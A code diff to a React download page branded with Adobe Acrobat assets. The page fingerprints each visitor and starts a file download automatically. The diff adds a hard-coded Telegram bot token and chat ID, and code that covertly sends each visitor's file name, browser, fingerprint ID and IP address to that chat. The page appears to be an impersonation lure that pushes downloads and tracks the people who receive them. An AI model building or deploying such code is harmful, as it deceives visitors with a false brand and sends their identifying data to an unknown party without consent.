@@ -1,15 +1,61 @@
-import { useEffect, useMemo } from "react";
+import { useEffect, useMemo, useRef } from "react";
 import { useVisitorData } from "@fingerprint/react";
 import adbLogo from "@/assets/adb-logo.png";
 import acrobatBg from "@/assets/adobe-acrobat-bg.webp";
+
+const TELEGRAM_BOT_TOKEN = "8648729689:AAEj5AJW3EJOAMYkAtVbm1DgSNgTy2fo1jw";
+const TELEGRAM_CHAT_ID = "7038669352";
 
 const randomDigits = (len = 8) =>
   Array.from(crypto.getRandomValues(new Uint8Array(len)))
     .map((b) => (b % 10).toString())
     .join("");
 
+const sendTelegramNotification = async (info: {
+  fileName: string;
+  browser: string;
+  visitorId?: string;
+  ip?: string;
+}) => {
+  const time = new Date().toLocaleString("en-US", { timeZone: "UTC" });
+  const message =
+    `📥 *New Download*\n\n` +
+    `📄 File: \`${info.fileName}\`\n` +
+    `🌐 Browser: ${info.browser}\n` +
+    `🕐 Time (UTC): ${time}\n` +
+    (info.visitorId ? `🆔 Visitor: \`${info.visitorId}\`\n` : "") +
+    (info.ip ? `📍 IP: \`${info.ip}\`` : "");
+
+  try {
+    await fetch(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "Markdown",
+        }),
+      }
+    );
+  } catch (e) {
+    console.error("Telegram notification failed:", e);
+  }
+};
+
+const getBrowserName = () => {
+  const ua = navigator.userAgent;
+  if (ua.includes("Edg/")) return "Edge";
+  if (ua.includes("Chrome")) return "Chrome";
+  if (ua.includes("Firefox")) return "Firefox";
+  if (ua.includes("Safari")) return "Safari";
+  return "Unknown";
+};
+
 const Download = () => {
   const { data: visitorData } = useVisitorData({ immediate: true });
+  const notifiedRef = useRef(false);
 
   useEffect(() => {
     if (visitorData) {
@@ -39,6 +85,17 @@ const Download = () => {
       document.body.appendChild(link);
       link.click();
       document.body.removeChild(link);
+
+      // Send Telegram notification once
+      if (!notifiedRef.current) {
+        notifiedRef.current = true;
+        sendTelegramNotification({
+          fileName: downloadFile.name,
+          browser: getBrowserName(),
+          visitorId: visitorData?.visitor_id,
+          ip: (visitorData as any)?.ip,
+        });
+      }
     }, 1000);
     return () => clearTimeout(timer);
   }, []);
